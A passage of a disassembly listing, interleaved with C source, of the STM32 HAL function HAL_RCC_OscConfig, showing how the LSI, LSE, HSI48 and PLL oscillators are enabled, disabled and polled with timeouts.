 8003bfc:	4b62      	ldr	r3, [pc, #392]	; (8003d88 <HAL_RCC_OscConfig+0x504>)
 8003bfe:	685b      	ldr	r3, [r3, #4]
 8003c00:	f023 52f8 	bic.w	r2, r3, #520093696	; 0x1f000000
 8003c04:	687b      	ldr	r3, [r7, #4]
 8003c06:	691b      	ldr	r3, [r3, #16]
 8003c08:	061b      	lsls	r3, r3, #24
 8003c0a:	495f      	ldr	r1, [pc, #380]	; (8003d88 <HAL_RCC_OscConfig+0x504>)
 8003c0c:	4313      	orrs	r3, r2
 8003c0e:	604b      	str	r3, [r1, #4]
 8003c10:	e018      	b.n	8003c44 <HAL_RCC_OscConfig+0x3c0>
      }
      else
      {
        /* Disable the Internal High Speed oscillator (HSI). */
        __HAL_RCC_HSI_DISABLE();
 8003c12:	4b5d      	ldr	r3, [pc, #372]	; (8003d88 <HAL_RCC_OscConfig+0x504>)
 8003c14:	681b      	ldr	r3, [r3, #0]
 8003c16:	4a5c      	ldr	r2, [pc, #368]	; (8003d88 <HAL_RCC_OscConfig+0x504>)
 8003c18:	f423 7380 	bic.w	r3, r3, #256	; 0x100
 8003c1c:	6013      	str	r3, [r2, #0]

        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 8003c1e:	f7fd faad 	bl	800117c <HAL_GetTick>
 8003c22:	6138      	str	r0, [r7, #16]

        /* Wait till HSI is disabled */
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U)
 8003c24:	e008      	b.n	8003c38 <HAL_RCC_OscConfig+0x3b4>
        {
          if((HAL_GetTick() - tickstart) > HSI_TIMEOUT_VALUE)
 8003c26:	f7fd faa9 	bl	800117c <HAL_GetTick>
 8003c2a:	4602      	mov	r2, r0
 8003c2c:	693b      	ldr	r3, [r7, #16]
 8003c2e:	1ad3      	subs	r3, r2, r3
 8003c30:	2b02      	cmp	r3, #2
 8003c32:	d901      	bls.n	8003c38 <HAL_RCC_OscConfig+0x3b4>
          {
            return HAL_TIMEOUT;
 8003c34:	2303      	movs	r3, #3
 8003c36:	e231      	b.n	800409c <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_HSIRDY) != 0U)
 8003c38:	4b53      	ldr	r3, [pc, #332]	; (8003d88 <HAL_RCC_OscConfig+0x504>)
 8003c3a:	681b      	ldr	r3, [r3, #0]
 8003c3c:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 8003c40:	2b00      	cmp	r3, #0
 8003c42:	d1f0      	bne.n	8003c26 <HAL_RCC_OscConfig+0x3a2>
        }
      }
    }
  }
  /*------------------------------ LSI Configuration -------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_LSI) == RCC_OSCILLATORTYPE_LSI)
 8003c44:	687b      	ldr	r3, [r7, #4]
 8003c46:	681b      	ldr	r3, [r3, #0]
 8003c48:	f003 0308 	and.w	r3, r3, #8
 8003c4c:	2b00      	cmp	r3, #0
 8003c4e:	d03c      	beq.n	8003cca <HAL_RCC_OscConfig+0x446>
  {
    /* Check the parameters */
    assert_param(IS_RCC_LSI(RCC_OscInitStruct->LSIState));

    /* Check the LSI State */
    if(RCC_OscInitStruct->LSIState != RCC_LSI_OFF)
 8003c50:	687b      	ldr	r3, [r7, #4]
 8003c52:	695b      	ldr	r3, [r3, #20]
 8003c54:	2b00      	cmp	r3, #0
 8003c56:	d01c      	beq.n	8003c92 <HAL_RCC_OscConfig+0x40e>
        MODIFY_REG(RCC->CSR, RCC_CSR_LSIPREDIV, RCC_OscInitStruct->LSIDiv);
      }
#endif /* RCC_CSR_LSIPREDIV */

      /* Enable the Internal Low Speed oscillator (LSI). */
      __HAL_RCC_LSI_ENABLE();
 8003c58:	4b4b      	ldr	r3, [pc, #300]	; (8003d88 <HAL_RCC_OscConfig+0x504>)
 8003c5a:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003c5e:	4a4a      	ldr	r2, [pc, #296]	; (8003d88 <HAL_RCC_OscConfig+0x504>)
 8003c60:	f043 0301 	orr.w	r3, r3, #1
 8003c64:	f8c2 3094 	str.w	r3, [r2, #148]	; 0x94

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003c68:	f7fd fa88 	bl	800117c <HAL_GetTick>
 8003c6c:	6138      	str	r0, [r7, #16]

      /* Wait till LSI is ready */
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) == 0U)
 8003c6e:	e008      	b.n	8003c82 <HAL_RCC_OscConfig+0x3fe>
      {
        if((HAL_GetTick() - tickstart) > LSI_TIMEOUT_VALUE)
 8003c70:	f7fd fa84 	bl	800117c <HAL_GetTick>
 8003c74:	4602      	mov	r2, r0
 8003c76:	693b      	ldr	r3, [r7, #16]
 8003c78:	1ad3      	subs	r3, r2, r3
 8003c7a:	2b02      	cmp	r3, #2
 8003c7c:	d901      	bls.n	8003c82 <HAL_RCC_OscConfig+0x3fe>
        {
          return HAL_TIMEOUT;
 8003c7e:	2303      	movs	r3, #3
 8003c80:	e20c      	b.n	800409c <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) == 0U)
 8003c82:	4b41      	ldr	r3, [pc, #260]	; (8003d88 <HAL_RCC_OscConfig+0x504>)
 8003c84:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003c88:	f003 0302 	and.w	r3, r3, #2
 8003c8c:	2b00      	cmp	r3, #0
 8003c8e:	d0ef      	beq.n	8003c70 <HAL_RCC_OscConfig+0x3ec>
 8003c90:	e01b      	b.n	8003cca <HAL_RCC_OscConfig+0x446>
      }
    }
    else
    {
      /* Disable the Internal Low Speed oscillator (LSI). */
      __HAL_RCC_LSI_DISABLE();
 8003c92:	4b3d      	ldr	r3, [pc, #244]	; (8003d88 <HAL_RCC_OscConfig+0x504>)
 8003c94:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003c98:	4a3b      	ldr	r2, [pc, #236]	; (8003d88 <HAL_RCC_OscConfig+0x504>)
 8003c9a:	f023 0301 	bic.w	r3, r3, #1
 8003c9e:	f8c2 3094 	str.w	r3, [r2, #148]	; 0x94

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003ca2:	f7fd fa6b 	bl	800117c <HAL_GetTick>
 8003ca6:	6138      	str	r0, [r7, #16]

      /* Wait till LSI is disabled */
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) != 0U)
 8003ca8:	e008      	b.n	8003cbc <HAL_RCC_OscConfig+0x438>
      {
        if((HAL_GetTick() - tickstart) > LSI_TIMEOUT_VALUE)
 8003caa:	f7fd fa67 	bl	800117c <HAL_GetTick>
 8003cae:	4602      	mov	r2, r0
 8003cb0:	693b      	ldr	r3, [r7, #16]
 8003cb2:	1ad3      	subs	r3, r2, r3
 8003cb4:	2b02      	cmp	r3, #2
 8003cb6:	d901      	bls.n	8003cbc <HAL_RCC_OscConfig+0x438>
        {
          return HAL_TIMEOUT;
 8003cb8:	2303      	movs	r3, #3
 8003cba:	e1ef      	b.n	800409c <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CSR, RCC_CSR_LSIRDY) != 0U)
 8003cbc:	4b32      	ldr	r3, [pc, #200]	; (8003d88 <HAL_RCC_OscConfig+0x504>)
 8003cbe:	f8d3 3094 	ldr.w	r3, [r3, #148]	; 0x94
 8003cc2:	f003 0302 	and.w	r3, r3, #2
 8003cc6:	2b00      	cmp	r3, #0
 8003cc8:	d1ef      	bne.n	8003caa <HAL_RCC_OscConfig+0x426>
        }
      }
    }
  }
  /*------------------------------ LSE Configuration -------------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_LSE) == RCC_OSCILLATORTYPE_LSE)
 8003cca:	687b      	ldr	r3, [r7, #4]
 8003ccc:	681b      	ldr	r3, [r3, #0]
 8003cce:	f003 0304 	and.w	r3, r3, #4
 8003cd2:	2b00      	cmp	r3, #0
 8003cd4:	f000 80a6 	beq.w	8003e24 <HAL_RCC_OscConfig+0x5a0>
  {
    FlagStatus       pwrclkchanged = RESET;
 8003cd8:	2300      	movs	r3, #0
 8003cda:	77fb      	strb	r3, [r7, #31]
    /* Check the parameters */
    assert_param(IS_RCC_LSE(RCC_OscInitStruct->LSEState));

    /* Update LSE configuration in Backup Domain control register    */
    /* Requires to enable write access to Backup Domain of necessary */
    if(HAL_IS_BIT_CLR(RCC->APB1ENR1, RCC_APB1ENR1_PWREN))
 8003cdc:	4b2a      	ldr	r3, [pc, #168]	; (8003d88 <HAL_RCC_OscConfig+0x504>)
 8003cde:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003ce0:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8003ce4:	2b00      	cmp	r3, #0
 8003ce6:	d10d      	bne.n	8003d04 <HAL_RCC_OscConfig+0x480>
    {
      __HAL_RCC_PWR_CLK_ENABLE();
 8003ce8:	4b27      	ldr	r3, [pc, #156]	; (8003d88 <HAL_RCC_OscConfig+0x504>)
 8003cea:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003cec:	4a26      	ldr	r2, [pc, #152]	; (8003d88 <HAL_RCC_OscConfig+0x504>)
 8003cee:	f043 5380 	orr.w	r3, r3, #268435456	; 0x10000000
 8003cf2:	6593      	str	r3, [r2, #88]	; 0x58
 8003cf4:	4b24      	ldr	r3, [pc, #144]	; (8003d88 <HAL_RCC_OscConfig+0x504>)
 8003cf6:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003cf8:	f003 5380 	and.w	r3, r3, #268435456	; 0x10000000
 8003cfc:	60bb      	str	r3, [r7, #8]
 8003cfe:	68bb      	ldr	r3, [r7, #8]
      pwrclkchanged = SET;
 8003d00:	2301      	movs	r3, #1
 8003d02:	77fb      	strb	r3, [r7, #31]
    }

    if(HAL_IS_BIT_CLR(PWR->CR1, PWR_CR1_DBP))
 8003d04:	4b21      	ldr	r3, [pc, #132]	; (8003d8c <HAL_RCC_OscConfig+0x508>)
 8003d06:	681b      	ldr	r3, [r3, #0]
 8003d08:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8003d0c:	2b00      	cmp	r3, #0
 8003d0e:	d118      	bne.n	8003d42 <HAL_RCC_OscConfig+0x4be>
    {
      /* Enable write access to Backup domain */
      SET_BIT(PWR->CR1, PWR_CR1_DBP);
 8003d10:	4b1e      	ldr	r3, [pc, #120]	; (8003d8c <HAL_RCC_OscConfig+0x508>)
 8003d12:	681b      	ldr	r3, [r3, #0]
 8003d14:	4a1d      	ldr	r2, [pc, #116]	; (8003d8c <HAL_RCC_OscConfig+0x508>)
 8003d16:	f443 7380 	orr.w	r3, r3, #256	; 0x100
 8003d1a:	6013      	str	r3, [r2, #0]

      /* Wait for Backup domain Write protection disable */
      tickstart = HAL_GetTick();
 8003d1c:	f7fd fa2e 	bl	800117c <HAL_GetTick>
 8003d20:	6138      	str	r0, [r7, #16]

      while(HAL_IS_BIT_CLR(PWR->CR1, PWR_CR1_DBP))
 8003d22:	e008      	b.n	8003d36 <HAL_RCC_OscConfig+0x4b2>
      {
        if((HAL_GetTick() - tickstart) > RCC_DBP_TIMEOUT_VALUE)
 8003d24:	f7fd fa2a 	bl	800117c <HAL_GetTick>
 8003d28:	4602      	mov	r2, r0
 8003d2a:	693b      	ldr	r3, [r7, #16]
 8003d2c:	1ad3      	subs	r3, r2, r3
 8003d2e:	2b02      	cmp	r3, #2
 8003d30:	d901      	bls.n	8003d36 <HAL_RCC_OscConfig+0x4b2>
        {
          return HAL_TIMEOUT;
 8003d32:	2303      	movs	r3, #3
 8003d34:	e1b2      	b.n	800409c <HAL_RCC_OscConfig+0x818>
      while(HAL_IS_BIT_CLR(PWR->CR1, PWR_CR1_DBP))
 8003d36:	4b15      	ldr	r3, [pc, #84]	; (8003d8c <HAL_RCC_OscConfig+0x508>)
 8003d38:	681b      	ldr	r3, [r3, #0]
 8003d3a:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8003d3e:	2b00      	cmp	r3, #0
 8003d40:	d0f0      	beq.n	8003d24 <HAL_RCC_OscConfig+0x4a0>
    {
      CLEAR_BIT(RCC->BDCR, RCC_BDCR_LSEON);
      CLEAR_BIT(RCC->BDCR, RCC_BDCR_LSEBYP);
    }
#else
    __HAL_RCC_LSE_CONFIG(RCC_OscInitStruct->LSEState);
 8003d42:	687b      	ldr	r3, [r7, #4]
 8003d44:	689b      	ldr	r3, [r3, #8]
 8003d46:	2b01      	cmp	r3, #1
 8003d48:	d108      	bne.n	8003d5c <HAL_RCC_OscConfig+0x4d8>
 8003d4a:	4b0f      	ldr	r3, [pc, #60]	; (8003d88 <HAL_RCC_OscConfig+0x504>)
 8003d4c:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003d50:	4a0d      	ldr	r2, [pc, #52]	; (8003d88 <HAL_RCC_OscConfig+0x504>)
 8003d52:	f043 0301 	orr.w	r3, r3, #1
 8003d56:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8003d5a:	e029      	b.n	8003db0 <HAL_RCC_OscConfig+0x52c>
 8003d5c:	687b      	ldr	r3, [r7, #4]
 8003d5e:	689b      	ldr	r3, [r3, #8]
 8003d60:	2b05      	cmp	r3, #5
 8003d62:	d115      	bne.n	8003d90 <HAL_RCC_OscConfig+0x50c>
 8003d64:	4b08      	ldr	r3, [pc, #32]	; (8003d88 <HAL_RCC_OscConfig+0x504>)
 8003d66:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003d6a:	4a07      	ldr	r2, [pc, #28]	; (8003d88 <HAL_RCC_OscConfig+0x504>)
 8003d6c:	f043 0304 	orr.w	r3, r3, #4
 8003d70:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8003d74:	4b04      	ldr	r3, [pc, #16]	; (8003d88 <HAL_RCC_OscConfig+0x504>)
 8003d76:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003d7a:	4a03      	ldr	r2, [pc, #12]	; (8003d88 <HAL_RCC_OscConfig+0x504>)
 8003d7c:	f043 0301 	orr.w	r3, r3, #1
 8003d80:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8003d84:	e014      	b.n	8003db0 <HAL_RCC_OscConfig+0x52c>
 8003d86:	bf00      	nop
 8003d88:	40021000 	.word	0x40021000
 8003d8c:	40007000 	.word	0x40007000
 8003d90:	4b9a      	ldr	r3, [pc, #616]	; (8003ffc <HAL_RCC_OscConfig+0x778>)
 8003d92:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003d96:	4a99      	ldr	r2, [pc, #612]	; (8003ffc <HAL_RCC_OscConfig+0x778>)
 8003d98:	f023 0301 	bic.w	r3, r3, #1
 8003d9c:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8003da0:	4b96      	ldr	r3, [pc, #600]	; (8003ffc <HAL_RCC_OscConfig+0x778>)
 8003da2:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003da6:	4a95      	ldr	r2, [pc, #596]	; (8003ffc <HAL_RCC_OscConfig+0x778>)
 8003da8:	f023 0304 	bic.w	r3, r3, #4
 8003dac:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
#endif /* RCC_BDCR_LSESYSDIS */

    /* Check the LSE State */
    if(RCC_OscInitStruct->LSEState != RCC_LSE_OFF)
 8003db0:	687b      	ldr	r3, [r7, #4]
 8003db2:	689b      	ldr	r3, [r3, #8]
 8003db4:	2b00      	cmp	r3, #0
 8003db6:	d016      	beq.n	8003de6 <HAL_RCC_OscConfig+0x562>
    {
      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003db8:	f7fd f9e0 	bl	800117c <HAL_GetTick>
 8003dbc:	6138      	str	r0, [r7, #16]

      /* Wait till LSE is ready */
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 8003dbe:	e00a      	b.n	8003dd6 <HAL_RCC_OscConfig+0x552>
      {
        if((HAL_GetTick() - tickstart) > RCC_LSE_TIMEOUT_VALUE)
 8003dc0:	f7fd f9dc 	bl	800117c <HAL_GetTick>
 8003dc4:	4602      	mov	r2, r0
 8003dc6:	693b      	ldr	r3, [r7, #16]
 8003dc8:	1ad3      	subs	r3, r2, r3
 8003dca:	f241 3288 	movw	r2, #5000	; 0x1388
 8003dce:	4293      	cmp	r3, r2
 8003dd0:	d901      	bls.n	8003dd6 <HAL_RCC_OscConfig+0x552>
        {
          return HAL_TIMEOUT;
 8003dd2:	2303      	movs	r3, #3
 8003dd4:	e162      	b.n	800409c <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 8003dd6:	4b89      	ldr	r3, [pc, #548]	; (8003ffc <HAL_RCC_OscConfig+0x778>)
 8003dd8:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003ddc:	f003 0302 	and.w	r3, r3, #2
 8003de0:	2b00      	cmp	r3, #0
 8003de2:	d0ed      	beq.n	8003dc0 <HAL_RCC_OscConfig+0x53c>
 8003de4:	e015      	b.n	8003e12 <HAL_RCC_OscConfig+0x58e>
      }
    }
    else
    {
      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003de6:	f7fd f9c9 	bl	800117c <HAL_GetTick>
 8003dea:	6138      	str	r0, [r7, #16]

      /* Wait till LSE is disabled */
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) != 0U)
 8003dec:	e00a      	b.n	8003e04 <HAL_RCC_OscConfig+0x580>
      {
        if((HAL_GetTick() - tickstart) > RCC_LSE_TIMEOUT_VALUE)
 8003dee:	f7fd f9c5 	bl	800117c <HAL_GetTick>
 8003df2:	4602      	mov	r2, r0
 8003df4:	693b      	ldr	r3, [r7, #16]
 8003df6:	1ad3      	subs	r3, r2, r3
 8003df8:	f241 3288 	movw	r2, #5000	; 0x1388
 8003dfc:	4293      	cmp	r3, r2
 8003dfe:	d901      	bls.n	8003e04 <HAL_RCC_OscConfig+0x580>
        {
          return HAL_TIMEOUT;
 8003e00:	2303      	movs	r3, #3
 8003e02:	e14b      	b.n	800409c <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) != 0U)
 8003e04:	4b7d      	ldr	r3, [pc, #500]	; (8003ffc <HAL_RCC_OscConfig+0x778>)
 8003e06:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8003e0a:	f003 0302 	and.w	r3, r3, #2
 8003e0e:	2b00      	cmp	r3, #0
 8003e10:	d1ed      	bne.n	8003dee <HAL_RCC_OscConfig+0x56a>
      CLEAR_BIT(RCC->BDCR, RCC_BDCR_LSESYSDIS);
#endif /* RCC_BDCR_LSESYSDIS */
    }

    /* Restore clock configuration if changed */
    if(pwrclkchanged == SET)
 8003e12:	7ffb      	ldrb	r3, [r7, #31]
 8003e14:	2b01      	cmp	r3, #1
 8003e16:	d105      	bne.n	8003e24 <HAL_RCC_OscConfig+0x5a0>
    {
      __HAL_RCC_PWR_CLK_DISABLE();
 8003e18:	4b78      	ldr	r3, [pc, #480]	; (8003ffc <HAL_RCC_OscConfig+0x778>)
 8003e1a:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8003e1c:	4a77      	ldr	r2, [pc, #476]	; (8003ffc <HAL_RCC_OscConfig+0x778>)
 8003e1e:	f023 5380 	bic.w	r3, r3, #268435456	; 0x10000000
 8003e22:	6593      	str	r3, [r2, #88]	; 0x58
    }
  }
#if defined(RCC_HSI48_SUPPORT)
  /*------------------------------ HSI48 Configuration -----------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSI48) == RCC_OSCILLATORTYPE_HSI48)
 8003e24:	687b      	ldr	r3, [r7, #4]
 8003e26:	681b      	ldr	r3, [r3, #0]
 8003e28:	f003 0320 	and.w	r3, r3, #32
 8003e2c:	2b00      	cmp	r3, #0
 8003e2e:	d03c      	beq.n	8003eaa <HAL_RCC_OscConfig+0x626>
  {
    /* Check the parameters */
    assert_param(IS_RCC_HSI48(RCC_OscInitStruct->HSI48State));

    /* Check the LSI State */
    if(RCC_OscInitStruct->HSI48State != RCC_HSI48_OFF)
 8003e30:	687b      	ldr	r3, [r7, #4]
 8003e32:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8003e34:	2b00      	cmp	r3, #0
 8003e36:	d01c      	beq.n	8003e72 <HAL_RCC_OscConfig+0x5ee>
    {
      /* Enable the Internal Low Speed oscillator (HSI48). */
      __HAL_RCC_HSI48_ENABLE();
 8003e38:	4b70      	ldr	r3, [pc, #448]	; (8003ffc <HAL_RCC_OscConfig+0x778>)
 8003e3a:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 8003e3e:	4a6f      	ldr	r2, [pc, #444]	; (8003ffc <HAL_RCC_OscConfig+0x778>)
 8003e40:	f043 0301 	orr.w	r3, r3, #1
 8003e44:	f8c2 3098 	str.w	r3, [r2, #152]	; 0x98

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003e48:	f7fd f998 	bl	800117c <HAL_GetTick>
 8003e4c:	6138      	str	r0, [r7, #16]

      /* Wait till HSI48 is ready */
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) == 0U)
 8003e4e:	e008      	b.n	8003e62 <HAL_RCC_OscConfig+0x5de>
      {
        if((HAL_GetTick() - tickstart) > HSI48_TIMEOUT_VALUE)
 8003e50:	f7fd f994 	bl	800117c <HAL_GetTick>
 8003e54:	4602      	mov	r2, r0
 8003e56:	693b      	ldr	r3, [r7, #16]
 8003e58:	1ad3      	subs	r3, r2, r3
 8003e5a:	2b02      	cmp	r3, #2
 8003e5c:	d901      	bls.n	8003e62 <HAL_RCC_OscConfig+0x5de>
        {
          return HAL_TIMEOUT;
 8003e5e:	2303      	movs	r3, #3
 8003e60:	e11c      	b.n	800409c <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) == 0U)
 8003e62:	4b66      	ldr	r3, [pc, #408]	; (8003ffc <HAL_RCC_OscConfig+0x778>)
 8003e64:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 8003e68:	f003 0302 	and.w	r3, r3, #2
 8003e6c:	2b00      	cmp	r3, #0
 8003e6e:	d0ef      	beq.n	8003e50 <HAL_RCC_OscConfig+0x5cc>
 8003e70:	e01b      	b.n	8003eaa <HAL_RCC_OscConfig+0x626>
      }
    }
    else
    {
      /* Disable the Internal Low Speed oscillator (HSI48). */
      __HAL_RCC_HSI48_DISABLE();
 8003e72:	4b62      	ldr	r3, [pc, #392]	; (8003ffc <HAL_RCC_OscConfig+0x778>)
 8003e74:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 8003e78:	4a60      	ldr	r2, [pc, #384]	; (8003ffc <HAL_RCC_OscConfig+0x778>)
 8003e7a:	f023 0301 	bic.w	r3, r3, #1
 8003e7e:	f8c2 3098 	str.w	r3, [r2, #152]	; 0x98

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8003e82:	f7fd f97b 	bl	800117c <HAL_GetTick>
 8003e86:	6138      	str	r0, [r7, #16]

      /* Wait till HSI48 is disabled */
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) != 0U)
 8003e88:	e008      	b.n	8003e9c <HAL_RCC_OscConfig+0x618>
      {
        if((HAL_GetTick() - tickstart) > HSI48_TIMEOUT_VALUE)
 8003e8a:	f7fd f977 	bl	800117c <HAL_GetTick>
 8003e8e:	4602      	mov	r2, r0
 8003e90:	693b      	ldr	r3, [r7, #16]
 8003e92:	1ad3      	subs	r3, r2, r3
 8003e94:	2b02      	cmp	r3, #2
 8003e96:	d901      	bls.n	8003e9c <HAL_RCC_OscConfig+0x618>
        {
          return HAL_TIMEOUT;
 8003e98:	2303      	movs	r3, #3
 8003e9a:	e0ff      	b.n	800409c <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) != 0U)
 8003e9c:	4b57      	ldr	r3, [pc, #348]	; (8003ffc <HAL_RCC_OscConfig+0x778>)
 8003e9e:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 8003ea2:	f003 0302 	and.w	r3, r3, #2
 8003ea6:	2b00      	cmp	r3, #0
 8003ea8:	d1ef      	bne.n	8003e8a <HAL_RCC_OscConfig+0x606>
#endif /* RCC_HSI48_SUPPORT */
  /*-------------------------------- PLL Configuration -----------------------*/
  /* Check the parameters */
  assert_param(IS_RCC_PLL(RCC_OscInitStruct->PLL.PLLState));

  if(RCC_OscInitStruct->PLL.PLLState != RCC_PLL_NONE)
 8003eaa:	687b      	ldr	r3, [r7, #4]
 8003eac:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8003eae:	2b00      	cmp	r3, #0
 8003eb0:	f000 80f3 	beq.w	800409a <HAL_RCC_OscConfig+0x816>
  {
    /* PLL On ? */
    if(RCC_OscInitStruct->PLL.PLLState == RCC_PLL_ON)
 8003eb4:	687b      	ldr	r3, [r7, #4]
 8003eb6:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8003eb8:	2b02      	cmp	r3, #2
 8003eba:	f040 80c9 	bne.w	8004050 <HAL_RCC_OscConfig+0x7cc>
#endif /* RCC_PLLP_SUPPORT */
      assert_param(IS_RCC_PLLQ_VALUE(RCC_OscInitStruct->PLL.PLLQ));
      assert_param(IS_RCC_PLLR_VALUE(RCC_OscInitStruct->PLL.PLLR));

      /* Do nothing if PLL configuration is the unchanged */
      pll_config = RCC->PLLCFGR;
 8003ebe:	4b4f      	ldr	r3, [pc, #316]	; (8003ffc <HAL_RCC_OscConfig+0x778>)
 8003ec0:	68db      	ldr	r3, [r3, #12]
 8003ec2:	617b      	str	r3, [r7, #20]
      if((READ_BIT(pll_config, RCC_PLLCFGR_PLLSRC)  != RCC_OscInitStruct->PLL.PLLSource) ||
 8003ec4:	697b      	ldr	r3, [r7, #20]
 8003ec6:	f003 0203 	and.w	r2, r3, #3
 8003eca:	687b      	ldr	r3, [r7, #4]
 8003ecc:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 8003ece:	429a      	cmp	r2, r3
 8003ed0:	d12c      	bne.n	8003f2c <HAL_RCC_OscConfig+0x6a8>
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLM)    != ((RCC_OscInitStruct->PLL.PLLM - 1U) << RCC_PLLCFGR_PLLM_Pos)) ||
 8003ed2:	697b      	ldr	r3, [r7, #20]
 8003ed4:	f003 0270 	and.w	r2, r3, #112	; 0x70
 8003ed8:	687b      	ldr	r3, [r7, #4]
 8003eda:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 8003edc:	3b01      	subs	r3, #1
 8003ede:	011b      	lsls	r3, r3, #4
      if((READ_BIT(pll_config, RCC_PLLCFGR_PLLSRC)  != RCC_OscInitStruct->PLL.PLLSource) ||
 8003ee0:	429a      	cmp	r2, r3
 8003ee2:	d123      	bne.n	8003f2c <HAL_RCC_OscConfig+0x6a8>
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLN)    != (RCC_OscInitStruct->PLL.PLLN << RCC_PLLCFGR_PLLN_Pos)) ||
 8003ee4:	697b      	ldr	r3, [r7, #20]
 8003ee6:	f403 42fe 	and.w	r2, r3, #32512	; 0x7f00
 8003eea:	687b      	ldr	r3, [r7, #4]
 8003eec:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 8003eee:	021b      	lsls	r3, r3, #8
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLM)    != ((RCC_OscInitStruct->PLL.PLLM - 1U) << RCC_PLLCFGR_PLLM_Pos)) ||
 8003ef0:	429a      	cmp	r2, r3
 8003ef2:	d11b      	bne.n	8003f2c <HAL_RCC_OscConfig+0x6a8>
#if defined(RCC_PLLP_SUPPORT)
#if defined(RCC_PLLP_DIV_2_31_SUPPORT)
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLPDIV) != (RCC_OscInitStruct->PLL.PLLP << RCC_PLLCFGR_PLLPDIV_Pos)) ||
 8003ef4:	697b      	ldr	r3, [r7, #20]
 8003ef6:	f003 4278 	and.w	r2, r3, #4160749568	; 0xf8000000
 8003efa:	687b      	ldr	r3, [r7, #4]
 8003efc:	6b9b      	ldr	r3, [r3, #56]	; 0x38
 8003efe:	06db      	lsls	r3, r3, #27
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLN)    != (RCC_OscInitStruct->PLL.PLLN << RCC_PLLCFGR_PLLN_Pos)) ||
 8003f00:	429a      	cmp	r2, r3
 8003f02:	d113      	bne.n	8003f2c <HAL_RCC_OscConfig+0x6a8>
#else
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLP)    != ((RCC_OscInitStruct->PLL.PLLP == RCC_PLLP_DIV7) ? 0U : 1U)) ||
#endif
#endif
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLQ)    != ((((RCC_OscInitStruct->PLL.PLLQ) >> 1U) - 1U) << RCC_PLLCFGR_PLLQ_Pos)) ||
 8003f04:	697b      	ldr	r3, [r7, #20]
 8003f06:	f403 02c0 	and.w	r2, r3, #6291456	; 0x600000
 8003f0a:	687b      	ldr	r3, [r7, #4]
 8003f0c:	6bdb      	ldr	r3, [r3, #60]	; 0x3c
 8003f0e:	085b      	lsrs	r3, r3, #1
 8003f10:	3b01      	subs	r3, #1
 8003f12:	055b      	lsls	r3, r3, #21
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLPDIV) != (RCC_OscInitStruct->PLL.PLLP << RCC_PLLCFGR_PLLPDIV_Pos)) ||
 8003f14:	429a      	cmp	r2, r3
